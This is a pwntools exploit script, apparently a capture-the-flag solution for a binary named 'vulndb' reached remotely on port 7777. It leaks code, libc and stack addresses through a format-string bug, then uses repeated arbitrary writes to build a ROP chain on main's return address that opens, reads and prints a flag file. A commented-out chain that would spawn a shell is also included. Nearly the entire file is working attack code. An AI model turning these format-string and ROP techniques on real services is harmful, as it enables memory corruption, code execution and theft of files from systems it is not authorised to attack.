#!/usr/bin/python3
from pwn import *
import pwnlib.shellcraft
import pwnlib
import sys

name = 'qq'
e = ELF('./vulndb')
libc = ELF('./libc.so.6')
c = process('./patch_bin'.split(), env={'LD_PRELOAD': './libc.so.6', 'LD_LIBRARY_PATH': './'})
c = remote(sys.argv[1], '7777')
isdebug = False
"""
if isdebug:
    pass
    print(c.libs())
    gdbcmd = '''
    info proc mappings
    set $elf_base={}
    set $libc = *($elf_base + {}) - {}
    p  $elf_base+0x6140
    # b *$elf_base+0x1679
    b *$libc+0x2584d
    #b *$elf_base+0x1606
    '''.format(hex(c.libs()[c.cwd + '/' + 'patch_bin']),hex(e.got['gets']),hex(libc.symbols['gets']))

    gdb.attach(c, gdbcmd)
    #context.log_level ='debug'
"""

#context.log_level ='debug'
context.os='linux'
context.arch = 'amd64'



def create_db(name):
    c.sendlineafter(']>>', 'Create db')
    c.sendlineafter('name: ', name)

c.sendlineafter('[db]>>', 'Create db')
c.sendlineafter('name: ', 'ok google')
c.sendlineafter(']>>', 'Select db')
c.sendlineafter('id: ', '0')
c.sendlineafter(']>>', 'Create table')

c.sendlineafter('name: ','./flag' if isdebug else '/home/vulndb/flag')
c.sendlineafter('name: ', 'ok google')
c.sendlineafter('): ', '1')
c.sendlineafter('? ', 'no')

############# leak libc ##################
def fmt_att(payload, addr=b''):
    c.sendlineafter(']>>', b'Select table' + addr)
    c.sendlineafter('name: ', payload)

fmt_att(b'%55$p %69$p %54$p')
c.recvuntil('db has such table: ')
addr = c.recvline()[:-1].split(b' ')
code_base = int(addr[0], 16) - 0x2637
libc_base = int(addr[1], 16) - 0x270b3
rbp = int(addr[2], 16)
main_ret = rbp + 0x38
bss = code_base + 0x6500
print(hex(code_base))
print(hex(libc_base))
print(hex(rbp)) # rbp
print(hex(main_ret))


gets_addr = libc_base + libc.symbols['gets']
system_addr = libc_base + libc.symbols['system']
hook_addr = libc_base + libc.symbols['__malloc_hook']
atol_addr = code_base + e.got['atol']
atoi_addr = code_base + e.got['atoi']
one_gedget = libc_base + 0xe6e73

print(hex(system_addr))
print(hex(atol_addr))

fmt_att('heap!%56$p\n')
c.recvuntil('heap!')
heap_db_name = int(c.recvline('\n')[:-1], 16)
print(hex(heap_db_name))
flag_addr = heap_db_name
#input()

def target(target_addr, new_got):
    if new_got > 0xff:
        addrs = [
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (new_got & 0xff) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (((new_got & 0xff00) >> 8)) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (((new_got & 0xff0000) >> 16)) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (((new_got & 0xff000000) >> 24)) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (((new_got & 0xff00000000) >> 32)) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (((new_got & 0xff0000000000) >> 40)) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
        ]
    else:
        addrs = [
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, (new_got & 0xff) - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
            pwnlib.fmtstr.AtomWrite(0x1b, 0x1, 0x100 - 0x1b),
        ]
    
    for i in range(len(addrs)):
        payload = pwnlib.fmtstr.make_payload_dollar(
            13, addrs[i]
        )[0]
        payload = flat({0: payload, 14: p64(target_addr+i)})
        fmt_att(payload)
#ROP = p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_pop_r12_ret) + p64(0) + p64(0) + p64(pop_rax_ret) + p64(0x3b) + p64(syscall)
pop_rdi_ret = 0x0000000000026b72 + libc_base
pop_rsi_ret = 0x0000000000027529 + libc_base
pop_rdx_pop_r12_ret = 0x000000000011c371 + libc_base
pop_rax_ret = 0x000000000004a550 + libc_base
syscall_ret = 0x0000000000066229 + libc_base
binsh = 0x00000000001b75aa + libc_base
"""
target(main_ret, pop_rdi_ret)
target(main_ret+8, binsh)
target(main_ret+0x10, pop_rsi_ret)
target(main_ret+0x18, 0)
target(main_ret+0x20, pop_rdx_pop_r12_ret)
target(main_ret+0x28, 0)
target(main_ret+0x30, 0)
target(main_ret+0x38, pop_rax_ret)
target(main_ret+0x40, 0x3b)
target(main_ret+0x48, syscall)
"""
print(hex(syscall_ret))
# open
target(main_ret, pop_rax_ret)
target(main_ret+8, 2)
target(main_ret+0x10, pop_rdi_ret)
target(main_ret+0x18, flag_addr) # address_of_name
target(main_ret+0x20, pop_rsi_ret)
target(main_ret+0x28, 0)
sleep(1)
target(main_ret+0x30, pop_rdx_pop_r12_ret)
target(main_ret+0x38, 0)
target(main_ret+0x40, 0)
target(main_ret+0x48, syscall_ret)
sleep(1)
# read
target(main_ret+0x50, pop_rax_ret)
target(main_ret+0x58, 0)
target(main_ret+0x60, pop_rdi_ret)
target(main_ret+0x68, 3) # address_of_name
target(main_ret+0x70, pop_rsi_ret)
sleep(1)
target(main_ret+0x78, bss)
target(main_ret+0x80, pop_rdx_pop_r12_ret)
target(main_ret+0x88, 0x100)
target(main_ret+0x90, 0)
target(main_ret+0x98, syscall_ret)
sleep(1)

# write
target(main_ret+0xa0, pop_rax_ret)
target(main_ret+0xa8, 1)
target(main_ret+0xb0, pop_rdi_ret)
target(main_ret+0xb8, 1) # address_of_name
target(main_ret+0xc0, syscall_ret)

c.sendline('Disconnect')
c.interactive()
